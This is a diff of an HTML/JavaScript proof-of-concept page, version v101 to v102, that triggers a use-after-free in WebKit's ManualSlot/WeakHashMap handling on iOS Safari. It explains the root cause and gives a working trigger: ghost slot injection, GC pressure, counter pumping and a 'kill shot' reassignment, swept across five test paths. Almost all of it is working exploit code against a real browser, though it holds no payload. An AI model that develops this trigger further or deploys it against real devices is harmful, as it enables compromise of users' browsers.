@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>ManualSlot UAF v101</title>
+<title>ManualSlot UAF v102</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { background:#0d0d0d; color:#00ff41; font-family:'Courier New',monospace; padding:16px; min-height:100vh; }
@@ -28,12 +28,20 @@ button.copy-done { border-color:#00ff41; color:#00ff41; animation: pulse 0.6s ea
 </head>
 <body>
 
-<h2>ManualSlot UAF v101 · rdar://179729192 · commit 0bab5af95d · RenderTree teardown rehash</h2>
+<h2>ManualSlot UAF v102 · rdar://179729192 · commit 0bab5af95d · RenderTree teardown rehash</h2>
 
 <div class="warn">
 ▶ OPEN DIRECTLY IN SAFARI on device.<br>
 <br>
-v101 ROOT CAUSE (commit 0bab5af95da144b45e240675e21391b3f5518a30, 2026-08-13):<br>
+v102 FIX vs v101:<br>
+  BUG: killShot() returned { sc_x, sc_y } — copied number values at return time (both 0).<br>
+       Even if slotchange fired during await, the already-returned object never updated.<br>
+  FIX: sc counters live in killShotAsync() closure, read AFTER await — correct timing.<br>
+  FIX: Only sc_x used as signal (sc_y uncertain — may not fire when childB is stolen by slotX).<br>
+  FIX: PATH-A now verifies sc_x=1 in healthy case — confirms correct wait time.<br>
+  FIX: Added RAF wait path if setTimeout(0) doesn't catch slotchange in time.<br>
+<br>
+v102 ROOT CAUSE (commit 0bab5af95da144b45e240675e21391b3f5518a30, 2026-08-13):<br>
 <br>
   slotManualAssignmentDidChange() takes raw ptr from assignedNodesForSlot(slot1)<br>
   → RenderTreeUpdater::tearDownRenderersAfterSlotChange → walks composed tree<br>
@@ -42,15 +50,12 @@ v101 ROOT CAUSE (commit 0bab5af95da144b45e240675e21391b3f5518a30, 2026-08-13):<b
   → sweeps ghost entries → REHASH → old bucket array FREED<br>
   → back up stack: reads effectiveCurrent (stale raw ptr to freed memory) → UAF<br>
 <br>
-REQUIREMENTS:<br>
-  1. Two slots in SAME shadow root (slot2 must be a sibling in composed-tree walk)<br>
-  2. Ghost entries = temp slots GC'd from m_slots WeakHashMap (dead WeakPtrs)<br>
-  3. Renderers on host (must be in visible layout — getBCR forces it)<br>
-  4. Pump m_slots operation counter to just below cleanup threshold<br>
-  5. Kill shot: slot1.assign(different_set) → triggers slotManualAssignmentDidChange<br>
-<br>
-NOTE: On unfixed iOS 26.5.2, this CRASHES the tab (SIGSEGV/SIGBUS).<br>
-Tab reload = success. Secondary: slotchange count mismatch.<br>
+DETECTION LOGIC (v102):<br>
+  PRIMARY: sc_x !== 1 after waiting for slotchange microtask + optional RAF<br>
+    → On healthy fixed WebKit: slotX assignment changed → slotchange MUST fire → sc_x=1<br>
+    → On UAF: freed memory comparison returns false-equal → slotchange suppressed → sc_x=0<br>
+  SECONDARY: ax !== 1 (slotX.assignedElements() should have exactly childB)<br>
+  PATH-A: confirms sc_x=1 baseline before any ghost/pump injection<br>
 </div>
 
 <div id="ctrl">
@@ -64,7 +69,7 @@ Tab reload = success. Secondary: slotchange count mismatch.<br>
   <button onclick="L.innerHTML=''">CLR</button>
 </div>
 <div id="log"></div>
-<div id="rig-area" id="rig-area"></div>
+<div id="rig-area"></div>
 
 <script>
 'use strict';
@@ -97,6 +102,7 @@ function copyLog(){
 }
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 function nextTick(){ return new Promise(r=>setTimeout(r,0)); }
+function nextFrame(){ return new Promise(r=>requestAnimationFrame(r)); }
 
 /* ──────────────────────────────────────────────
    RIG BUILDER
@@ -173,76 +179,77 @@ function pressureGC(){
 }
 
 /* ──────────────────────────────────────────────
-   KILL SHOT
-   Reassign slotX to childB (previously assigned to slotY).
-   This triggers slotManualAssignmentDidChange for slotX,
-   which calls tearDownRenderersAfterSlotChange → composed-tree walk
-   → hits slotY → ensure(slotY) on m_slots
-   → if counter at threshold → removeDeadKeysIfNeeded → REHASH
-   → effectiveCurrent (raw ptr to slotX's old entry) now points to freed memory
-   → UAF on read.
+   KILL SHOT — v102 FIXED
+   sc_x and sc_y are CLOSURE vars inside killShotAsync.
+   They are read AFTER the await, not from a sync return value.
+   This was the core bug in v101: { sc_x, sc_y } in the sync
+   return copied the number values (both 0) before the slotchange
+   microtask had a chance to fire and increment them.
    ────────────────────────────────────────────── */
-function killShot(r){
-  let sc_x = 0, sc_y = 0;
-  let scXnodes=[], scYnodes=[];
+async function killShotAsync(r, useRAF){
+  // sc counters live here — read AFTER await, not in sync return
+  let scX = 0, scY = 0;
 
-  r.slotX.addEventListener('slotchange', ()=>{
-    sc_x++;
-    scXnodes = Array.from(r.slotX.assignedElements());
-  });
-  r.slotY.addEventListener('slotchange', ()=>{
-    sc_y++;
-    scYnodes = Array.from(r.slotY.assignedElements());
-  });
+  const onSCX = () => { scX++; };
+  const onSCY = () => { scY++; };
 
-  // Kill: move childB from slotY to slotX
-  // Expected: slotX=[childB], slotY=[], sc_x=1, sc_y=1
+  r.slotX.addEventListener('slotchange', onSCX);
+  r.slotY.addEventListener('slotchange', onSCY);
+
+  // Kill: reassign slotX to childB (was childA)
+  // Triggers slotManualAssignmentDidChange → teardown → rehash → UAF
   r.slotX.assign(r.childB);
 
-  // Force layout to trigger teardown immediately
+  // Force layout so teardown runs immediately (renderers must exist)
   void r.host.getBoundingClientRect();
 
-  return { sc_x, sc_y, scXnodes, scYnodes };
-}
+  // Wait for slotchange to fire.
+  // Spec: "signal a slot change" queues a microtask → fires before next task.
+  // setTimeout(0) is a task — slotchange MUST have fired by then.
+  // RAF is backup if WebKit defers to layout cycle.
+  await nextTick();
+  if(useRAF) await nextFrame();
 
-async function killShotAsync(r){
-  const sync = killShot(r);
-  await nextTick(); // let slotchange microtasks fire
+  // Read AFTER await — this is the fix
+  const scXfinal = scX;
+  const scYfinal = scY;
+
+  r.slotX.removeEventListener('slotchange', onSCX);
+  r.slotY.removeEventListener('slotchange', onSCY);
+
   const ax = r.slotX.assignedElements();
   const ay = r.slotY.assignedElements();
+
   return {
-    ...sync,
-    ax: ax.length, axNode: ax[0],
-    ay: ay.length,
+    scX: scXfinal,
+    scY: scYfinal,
+    ax:  ax.length,
+    ay:  ay.length,
+    axNode: ax[0],
   };
 }
 
-/* Signal detection:
-   Expected after slotX.assign(childB):
-     slotX = [childB] → ax=1, axNode===childB, sc_x=1
-     slotY = []       → ay=0, sc_y=1 (childB was stolen)
-
-   Any deviation = state corruption signal.
-   (On a crash path we won't reach detection at all — tab dies.)
-*/
+/* ──────────────────────────────────────────────
+   SIGNAL DETECTION v102
+   PRIMARY signal: scX !== 1
+     slotX assignment changed A→B, so slotchange MUST fire on healthy browser.
+     If it doesn't = UAF suppressed the event via stale ptr comparison.
+   SECONDARY: ax !== 1 (state corruption — slotX should have childB)
+   scY NOT used as signal — uncertain whether childB-stolen case fires slotY.
+   ────────────────────────────────────────────── */
 function detectSignal(label, res, r){
-  const expAxLen  = 1;
-  const expAxNode = r.childB;
-  const expAyLen  = 0;
+  const badScX = res.scX !== 1;   // PRIMARY: slotX slotchange must fire
+  const badAx  = res.ax  !== 1;   // SECONDARY: slotX must have exactly 1 node
 
-  const badLen  = res.ax !== expAxLen;
-  const badNode = res.ax > 0 && res.axNode !== expAxNode;
-  const badAy   = res.ay !== expAyLen;
-  const badScX  = res.sc_x !== 1;
-  const badScY  = res.sc_y !== 1;  // childB stolen from Y → Y fires too
-
-  const bad = badLen || badNode || badAy || badScX || badScY;
-  return { bad, badLen, badNode, badAy, badScX, badScY };
+  const bad = badScX || badAx;
+  return { bad, badScX, badAx };
 }
 
 /* ══════════════════════════════════════════════
    PATH-A: Baseline sanity — no ghosts, no pump
-   Should always be clean. Verifies detection logic.
+   v102: MUST show scX=1 in every run.
+   If scX=0 here → timing issue, not UAF.
+   Runs twice: once with nextTick only, once with RAF.
    ══════════════════════════════════════════════ */
 async function runPathA(){
   if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
@@ -250,35 +257,66 @@ async function runPathA(){
   log('━━━━━━━━━━━━ PATH-A: baseline (no ghosts, no pump) ━━━━━━━━━━━━','hi');
   log('╔══════════════════════════════════════════════════════════════╗','dim');
   log('║  PATH-A: two-slot rig, no ghost entries, no pump            ║','dim');
+  log('║  v102: scX MUST be 1 here (healthy browser confirmation)    ║','dim');
   log('╚══════════════════════════════════════════════════════════════╝','dim');
   log('','');
+  log('  [tick wait] — verifying slotchange fires within setTimeout(0)','inf');
 
   const RUNS = 5;
-  let sigs = 0;
+  let tickOk = 0, rafOk = 0;
+
   for(let i=0; i<RUNS; i++){
     const r = buildRig();
-    const res = await killShotAsync(r);
-    const det = detectSignal('A',res,r);
-    const str = `  [A${i+1}] ax=${res.ax} ay=${res.ay} sc_x=${res.sc_x} sc_y=${res.sc_y}`;
-    if(det.bad){
-      sigs++;
-      noteUAF(`A-baseline-corrupt`);
-      log(str+' ← SIGNAL','bad');
+    const res = await killShotAsync(r, false);
+    const str = `  [A-tick${i+1}] ax=${res.ax} ay=${res.ay} scX=${res.scX} scY=${res.scY}`;
+    if(res.scX === 1){
+      tickOk++;
+      log(str+' ✓ slotchange fired (healthy)','ok');
     } else {
-      log(str,'ok');
+      log(str+' ✗ scX=0 — tick not enough, need RAF','inf');
     }
     teardownRig(r);
   }
-  log(`\n  ${sigs} signals (expected 0)`, sigs===0?'ok':'bad');
+
+  log('','');
+  log('  [RAF wait] — verifying with requestAnimationFrame','inf');
+
+  for(let i=0; i<RUNS; i++){
+    const r = buildRig();
+    const res = await killShotAsync(r, true);
+    const str = `  [A-raf${i+1}]  ax=${res.ax} ay=${res.ay} scX=${res.scX} scY=${res.scY}`;
+    if(res.scX === 1){
+      rafOk++;
+      log(str+' ✓ slotchange fired (healthy)','ok');
+    } else {
+      log(str+' ✗ scX=0 even after RAF — browser may not fire in manual mode','inf');
+    }
+    teardownRig(r);
+  }
+
+  const useRaf = tickOk < RUNS && rafOk >= RUNS;
+  log('','');
+  log(`  tick-wait ok: ${tickOk}/${RUNS} | raf-wait ok: ${rafOk}/${RUNS}`, 'inf');
+  if(tickOk === RUNS){
+    log('  → setTimeout(0) is sufficient, using tick wait for all paths','ok');
+  } else if(rafOk >= RUNS){
+    log('  → RAF needed — slotchange fires after layout cycle','inf');
+    log('  → IMPORTANT: PATH-B/C/D/E use RAF wait for accurate detection','inf');
+  } else {
+    log('  ✗ slotchange not firing in this browser even with RAF — different signal needed','bad');
+    log('  → UAF detection may show false positives or false negatives','bad');
+  }
+
   if(!_inRunAll) dis(false);
+  return { useRaf };
 }
 
 /* ══════════════════════════════════════════════
    PATH-B: Ghost entries + kill, no pump sweep
-   Fixed ghost counts: 16, 32, 64
+   Fixed ghost counts: 8, 16, 32, 64, 128
    No pump (counter at 0 before kill)
    ══════════════════════════════════════════════ */
-async function runPathB(){
+async function runPathB(useRaf){
   if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('','');
   log('━━━━━━━━━━━━ PATH-B: ghosts only (no pump) ━━━━━━━━━━━━','hi');
@@ -294,17 +332,17 @@ async function runPathB(){
     const r = buildRig();
     injectGhosts(r.sr, ghosts);
     pressureGC();
-    await nextTick(); // yield for GC
+    await nextTick();
     pressureGC();
     await nextTick();
 
-    const res = await killShotAsync(r);
+    const res = await killShotAsync(r, useRaf);
     const det = detectSignal('B',res,r);
-    const str = `  [B-g${ghosts}] ax=${res.ax} ay=${res.ay} sc_x=${res.sc_x} sc_y=${res.sc_y}`;
+    const str = `  [B-g${ghosts}] ax=${res.ax} ay=${res.ay} scX=${res.scX} scY=${res.scY}`;
     if(det.bad){
       sigs++;
       noteUAF(`B-g${ghosts}`);
-      log(str+' ← SIGNAL','bad');
+      log(str+' ← SIGNAL  badScX='+det.badScX+' badAx='+det.badAx,'bad');
     } else {
       log(str,'ok');
     }
@@ -317,12 +355,11 @@ async function runPathB(){
 
 /* ══════════════════════════════════════════════
    PATH-C: Ghost entries + pump sweep (main path)
-   Sweep pump iterations 0..120 in steps of 5.
+   Sweep pump iterations 0..120 in steps of 4.
    GHOSTS=32 → m_slots table cap ~64.
    At pump=32: ~64 ops → threshold crossing.
-   Tries multiple ghost counts × pump values.
    ══════════════════════════════════════════════ */
-async function runPathC(){
+async function runPathC(useRaf){
   if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('','');
   log('━━━━━━━━━━━━ PATH-C: pump sweep (MAIN PATH) ━━━━━━━━━━━━','hi');
@@ -348,14 +385,14 @@ async function runPathC(){
 
     pumpCounter(r.slotX, r.slotY, pump);
 
-    const res = await killShotAsync(r);
+    const res = await killShotAsync(r, useRaf);
     const det = detectSignal('C',res,r);
-    const str = `  [C-p${pump}] ax=${res.ax} ay=${res.ay} sc_x=${res.sc_x} sc_y=${res.sc_y}`;
+    const str = `  [C-p${pump}] ax=${res.ax} ay=${res.ay} scX=${res.scX} scY=${res.scY}`;
     if(det.bad){
       sigs++;
       found = true;
       noteUAF(`C-pump${pump}`);
-      log(str+' ← SIGNAL  badLen='+det.badLen+' badAy='+det.badAy+' badScX='+det.badScX+' badScY='+det.badScY,'bad');
+      log(str+' ← SIGNAL  badScX='+det.badScX+' badAx='+det.badAx,'bad');
     } else {
       log(str,'dim');
     }
@@ -373,7 +410,7 @@ async function runPathC(){
    before running pump + kill shot.
    Most reliable reproduction.
    ══════════════════════════════════════════════ */
-async function runPathD(){
+async function runPathD(useRaf){
   if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('','');
   log('━━━━━━━━━━━━ PATH-D: GC-gated kill ━━━━━━━━━━━━','hi');
@@ -386,7 +423,6 @@ async function runPathD(){
   let sigs = 0;
 
   for(const pump of pumpCounts){
-    // Check FinalizationRegistry availability
     if(typeof FinalizationRegistry === 'undefined'){
       log('  FinalizationRegistry not available — skipping PATH-D','inf');
       break;
@@ -395,7 +431,6 @@ async function runPathD(){
     const r = buildRig();
     const GHOSTS = 32;
 
-    // Register tokens so we know when GC has run
     let gcCount = 0;
     const fr = new FinalizationRegistry(()=>{ gcCount++; });
     const tokens = [];
@@ -407,14 +442,11 @@ async function runPathD(){
       void tmp.assignedNodes();
       r.sr.removeChild(tmp);
 
-      // Register a separate object as the GC token
       const token = { i };
       fr.register(tmp, i, token);
       tokens.push(token);
-      // tmp goes out of scope here → GC candidate
     }
 
-    // Pressure GC in a loop until at least half the ghosts are collected
     let waited = 0;
     while(gcCount < Math.floor(GHOSTS/2) && waited < 20){
       pressureGC();
@@ -433,9 +465,9 @@ async function runPathD(){
 
     pumpCounter(r.slotX, r.slotY, pump);
 
-    const res = await killShotAsync(r);
+    const res = await killShotAsync(r, useRaf);
     const det = detectSignal('D',res,r);
-    const str = `  [D-p${pump}] ${gcStr} ax=${res.ax} ay=${res.ay} sc_x=${res.sc_x} sc_y=${res.sc_y}`;
+    const str = `  [D-p${pump}] ${gcStr} ax=${res.ax} ay=${res.ay} scX=${res.scX} scY=${res.scY}`;
     if(det.bad){
       sigs++;
       noteUAF(`D-pump${pump}-${gcStr}`);
@@ -455,7 +487,7 @@ async function runPathD(){
    Random pump counts 0..100, ghosts 16..64
    Rapid fire to hit the window probabilistically
    ══════════════════════════════════════════════ */
-async function runPathE(){
+async function runPathE(useRaf){
   if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('','');
   log('━━━━━━━━━━━━ PATH-E: stress ×200 ━━━━━━━━━━━━','hi');
@@ -469,8 +501,8 @@ async function runPathE(){
   let ok = 0;
 
   for(let i=0; i<RUNS; i++){
-    const ghosts = 8 + Math.floor(Math.random()*120);  // 8..127
-    const pump   = Math.floor(Math.random()*100);       // 0..99
+    const ghosts = 8 + Math.floor(Math.random()*120);
+    const pump   = Math.floor(Math.random()*100);
 
     const r = buildRig();
     injectGhosts(r.sr, ghosts);
@@ -478,15 +510,18 @@ async function runPathE(){
     await nextTick();
     pumpCounter(r.slotX, r.slotY, pump);
 
-    const res = await killShotAsync(r);
+    const res = await killShotAsync(r, useRaf);
     const det = detectSignal('E',res,r);
 
     if(det.bad){
       sigs++;
       noteUAF(`E-g${ghosts}-p${pump}`);
-      log(`  [E${i+1}] g=${ghosts} p=${pump} ax=${res.ax} ay=${res.ay} sc_x=${res.sc_x} sc_y=${res.sc_y} ← SIGNAL`,'bad');
+      log(`  [E${i+1}] g=${ghosts} p=${pump} ax=${res.ax} ay=${res.ay} scX=${res.scX} scY=${res.scY} ← SIGNAL`,'bad');
     } else {
       ok++;
+      if(i < 5 || (i+1) % 50 === 0){
+        log(`  [E${i+1}] g=${ghosts} p=${pump} ax=${res.ax} scX=${res.scX} — ok`,'dim');
+      }
     }
     teardownRig(r);
 
@@ -501,28 +536,38 @@ async function runPathE(){
 
 /* ══════════════════════════════════════════════
    RUN ALL
+   PATH-A runs first to determine wait strategy
+   (tick vs RAF), then passes it to B/C/D/E.
    ══════════════════════════════════════════════ */
 async function runAll(){
   _inRunAll = true;
   dis(true); L.innerHTML=''; uafTotal=0;
 
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  v101 RUN ALL · ManualSlot m_slots WeakHashMap rehash UAF   ║','hi');
+  log('║  v102 RUN ALL · ManualSlot m_slots WeakHashMap rehash UAF   ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
   log('','');
   log('  Commit: 0bab5af95da144b45e240675e21391b3f5518a30 (2026-08-13)','inf');
-  log('  Title:  UAF in ManualSlotAssignment via WeakHashMap rehash during reentrant composed-tree teardown','inf');
+  log('  Title:  UAF in ManualSlotAssignment via WeakHashMap rehash during','inf');
+  log('          reentrant composed-tree teardown','inf');
+  log('  v102:   FIXED variable capture bug — sc counters read AFTER await','inf');
   log('','');
 
-  await runPathA();
-  await runPathB();
-  await runPathC();
-  await runPathD();
-  await runPathE();
+  // PATH-A calibrates timing strategy
+  const { useRaf } = await runPathA();
+
+  log('','');
+  log(`  Timing strategy: ${useRaf ? 'RAF wait' : 'tick wait'}`, 'inf');
+  log('','');
+
+  await runPathB(useRaf);
+  await runPathC(useRaf);
+  await runPathD(useRaf);
+  await runPathE(useRaf);
 
   log('','');
   log('══════════════════════════════════════════════════════════════','hi');
-  log(`  v101 RUN ALL COMPLETE · total UAF signals: ${uafTotal}`, uafTotal>0?'hit':'ok');
+  log(`  v102 RUN ALL COMPLETE · total UAF signals: ${uafTotal}`, uafTotal>0?'hit':'ok');
   log('══════════════════════════════════════════════════════════════','hi');
 
   _inRunAll = false;
